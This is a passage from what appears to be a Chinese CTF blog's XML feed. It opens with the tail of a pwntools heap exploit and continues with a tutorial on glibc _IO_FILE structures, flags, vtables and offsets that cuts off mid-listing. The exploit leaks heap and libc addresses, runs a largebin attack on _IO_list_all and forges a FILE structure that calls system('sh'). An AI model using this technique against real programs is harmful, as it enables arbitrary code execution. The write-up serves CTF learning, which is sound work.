class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">leak_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base=((leak_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)</span><br><span class="line">log.success(<span class="string">&quot;heap_base--&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(target_addr-<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">creat(<span class="number">5</span>,<span class="number">0x900</span>) <span class="comment">#chunk2作为fake_io_file进入largebin，完成largebin attack，_IO_list_all指向chunk2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x500</span>+p32(<span class="number">0xfbadf7f5</span>)+<span class="string">b&#x27;;sh\x00&#x27;</span>) <span class="comment">#利用presize复用来控制fake_io_file的_flags，同时写入&#x27;;sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">chunk_addr=heap_base+<span class="number">0x290</span>+<span class="number">0x530</span>+<span class="number">0x510</span> <span class="comment">#fake_io_file的地址</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_file = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x100</span>) <span class="comment">#wide_data</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#mode</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(io_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x200</span>) <span class="comment">#_wide_data-&gt;_wide_vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x200</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) * <span class="number">13</span> + p64(system) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_file)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于_IO_FILE</title>
      <link href="/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/"/>
      <url>/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>总结记录一下<code>_IO_FILE</code>的基础知识<br>参考博客<br><a href="https://blog.csdn.net/qq_45323960/article/details/123810198?spm=1001.2014.3001.5501">linux IO_FILE 利用_io list all结构体-CSDN博客</a><br><a href="https://loora1n.github.io/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/">【IO_FILE】源码详解 | Loora1N’s Blog | 鹭雨</a><br><a href="https://wiki.wgpsec.org/knowledge/ctf/iofile.html">【PWN】iofile | 狼组安全团队公开知识库</a><br></p><h2 id="0x01-IO-FILE结构"><a href="#0x01-IO-FILE结构" class="headerlink" title="0x01 _IO_FILE结构"></a>0x01 _IO_FILE结构</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 结构定义在 libio.h 中，如下所示<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的第一个成员<code>_flags</code>是一个非常重要且关键的值。其高两个字节是<code>_IO_MAGIC</code>（一个宏，其值为0xFBAD0000），用于检查<code>_IO_file</code>的合法性。glibc中存在的检查如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="comment">/*glibc中一个用于检查的宏如下*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;</span></span><br><span class="line">    <span class="keyword">if</span> ((FILE) == <span class="literal">NULL</span> ||</span><br><span class="line">        ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) &#123;</span><br><span class="line">        __set_errno (EINVAL);</span><br><span class="line">        <span class="keyword">return</span> RET;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="comment">/*glibc 在遍历 _IO_list_all （全局 FILE 链表）进行 flush/unbuffer 操作时，通常使用如下方式过滤不合法的文件*/</span></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) …)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>_flags</code>的低二字节，也就是低16bit是一个状态码，用于控制控制 FILE 的读写状态、缓存、put&#x2F;get 模式、错误状态等<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000    <span class="comment">/* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000      <span class="comment">/* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1                 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4                 <span class="comment">/* Reading not allowed 不允许读取操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10              <span class="comment">/* EOF seen 已经到达文件结尾（EOF） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20              <span class="comment">/* Error seen 已经发生错误 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40     <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80                <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100            <span class="comment">/* In backup 处于备份模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400         <span class="comment">/* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000          <span class="comment">/* Is file buffer 是一个文件缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000            <span class="comment">/* Bad seen 遇到错误（bad flag set） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000           <span class="comment">/* User lock 用户锁定，防止其他线程访问 */</span></span></span><br></pre></td></tr></table></figure><p><code>_IO_read_ptr</code>正在使用的input缓冲区的input地址<br><code>_IO_read_end</code> input缓冲区的结束地址<br><code>_IO_read_base</code> input缓冲区的基址<br><code>_IO_write_base</code> output缓冲区的基址<br><code>_IO_write_ptr</code> 指向还没输出的那个字节<br><code>_IO_write_end</code> output缓冲区的结束地址<br><code>_IO_buf_base</code> input和output缓冲区的基址<br><code>_IO_buf_end</code> input和output缓冲区的结束地址<br><code>_chain</code> 为<code>_IO_FILE *</code>类型，存放着一个单链表，用于串联所有的file stream（其实就是<code>_IO_FILE</code>结构体），表头通过<code>_IO_list_all</code>指针访问，注意<code>_IO_list_all</code>便是<code>_IO_FILE_plus *</code>类型的。结构如下所示<br></p><p><img src="/images/ea5063408b268d86b52ecebe0894e2b9.png"></p><p><code>_fileno</code> 与文件相关的文件描述符（例如stdin为0，stdout为1，stderr为2）<br><code>_vtable_offset</code> 存放虚表(virtual table)的偏移<br><code>_offset</code> 存放当前文件的偏移<br>至于vtable，为函数指针结构体，存放着各种 IO 相关的函数的指针，可以在另一个结构体<code>_IO_FILE_plus</code>中看到。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_jump_t</code>定义如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>IO函数便会调用这个表中的函数，以fopen，fread，fwrite，fclose为例<br>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。<br>fread函数中调用的vtable函数有：<br>* <code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。<br>*<code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。<br>*vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。<br>*<code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。<br>*vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。<br>fwrite 函数调用的vtable函数有：<br>*<code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。<br>*<code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。<br>*vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。<br>*vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。<br>*<code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。<br><code>fclose</code>函数调用的vtable函数有：<br>*在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。<br>*关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。<br>*<code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。<br></p><p>一个程序初始情况下有三个<code>_IO_FILE</code>，分别为 <code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin</code>，<code>_IO_list_all</code>初始默认指向<code>_IO_2_1_stderr_</code><br>并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向 <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体<br>结构如下所示<br></p><p><img src="/images/d2828352a7bf33e05ffd15edc47ac75f.png"></p><p>程序在进行文件IO操作时候，便会创建<code>_IO_FILE_plus</code>结构体，并使用头插法接入<code>_IO_list_all</code>链表中<br>下面就分析一下<code>fopen</code>，<code>fread</code>，<code>fwrite</code>，<code>fclose</code>四个函数，来学习一下<code>_IO_FILE_plus</code>的作用机制（<del>因为笔者本地没有下载glibc的源码，自己看源码的时候都是从其他地方看，因为懒得再从其他地方贴源码过来，所以下面调试都是硬看汇编的</del>）<br>再放上结构体内的偏移对应<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"> </span><br><span class="line">0x0:&#x27;_flags&#x27;,</span><br><span class="line">0x8:&#x27;_IO_read_ptr&#x27;,</span><br><span class="line">0x10:&#x27;_IO_read_end&#x27;,</span><br><span class="line">0x18:&#x27;_IO_read_base&#x27;,</span><br><span class="line">0x20:&#x27;_IO_write_base&#x27;,</span><br><span class="line">0x28:&#x27;_IO_write_ptr&#x27;,</span><br><span class="line">0x30:&#x27;_IO_write_end&#x27;,</span><br><span class="line">0x38:&#x27;_IO_buf_base&#x27;,</span><br><span class="line">0x40:&#x27;_IO_buf_end&#x27;,</span><br><span class="line">0x48:&#x27;_IO_save_base&#x27;,</span><br><span class="line">0x50:&#x27;_IO_backup_base&#x27;,</span><br><span class="line">0x58:&#x27;_IO_save_end&#x27;,</span><br><span class="line">0x60:&#x27;_markers&#x27;,</span><br><span class="line">0x68:&#x27;_chain&#x27;,</span><br><span class="line">0x70:&#x27;_fileno&#x27;,</span><br><span class="line">0x74:&#x27;_flags2&#x27;,</span><br><span class="line">0x78:&#x27;_old_offset&#x27;,</span><br><span class="line">0x80:&#x27;_cur_column&#x27;,</span><br><span class="line">0x82:&#x27;_vtable_offset&#x27;,</span><br><span class="line">0x83:&#x27;_shortbuf&#x27;,</span><br><span class="line">0x88:&#x27;_lock&#x27;,</span><br><span class="line">0x90:&#x27;_offset&#x27;,</span><br><span class="line">0x98:&#x27;_codecvt&#x27;,</span><br><span class="line">0xa0:&#x27;_wide_data&#x27;,</span><br><span class="line">0xa8:&#x27;_freeres_list&#x27;,</span><br><span class="line">0xb0:&#x27;_freeres_buf&#x27;,</span><br><span class="line">0xb8:&#x27;__pad5&#x27;,</span><br><span class="line">0xc0:&#x27;_mode&#x27;,</span><br><span class="line">0xc4:&#x27;_unused2&#x27;,</span><br><span class="line">0xd8:&#x27;vtable&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x02-fopen函数"><a href="#0x02-fopen函数" class="headerlink" title="0x02 fopen函数"></a>0x02 fopen函数</h2><p>写个demo来调试一下（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fopen下个断点跟进fopen函数看看<br>发现fopen函数实际上是<code>_IO_new_fopen</code><br>其汇编如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 